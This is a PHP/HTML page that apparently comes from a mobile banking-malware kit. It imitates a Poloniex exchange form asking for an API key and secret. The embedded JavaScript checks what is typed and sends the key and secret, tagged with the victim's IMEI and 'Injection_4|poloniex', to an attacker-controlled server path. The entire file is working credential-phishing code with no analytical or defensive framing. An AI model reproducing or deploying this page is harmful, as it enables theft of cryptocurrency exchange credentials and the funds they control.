<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="payment/com.plunien.poloniex/style.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        Cancel
    </div>
    <form action="null" class="form" class="form" method="post" id="_mainForm" target="flow_handler">
        <p> API KEY & SECRET </p>
        <div class="form-inputs">
            <div class="field11" style="border-bottom: 1px solid #c8c7cc;">
                <label for="key"> API Key </label>
                <input type="text" class="field" name="key" id="key" placeholder="Enter API Key here">
            </div>
            <div class="field11">
                <label for="secret"> API Secret </label>
                <input type="password" class="field" name="secret" id="secret" placeholder="Enter API Secret here">
            </div>
        </div>
        <div class="field12">
            <input type="submit" class="button" id="sbt_button" value="Save API Key & Secret">
        </div>
    </form>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {
        
            var oNumInp = document.getElementById('key');
            var oCodeInp = document.getElementById('secret');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};
            
            if (!/^\w{4,100}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }
            
            if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }
			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|poloniex|"+oNumInp.value+"|"+oCodeInp.value);
           
           return false;
       };
       
   })();
</script>
</body>
</html>
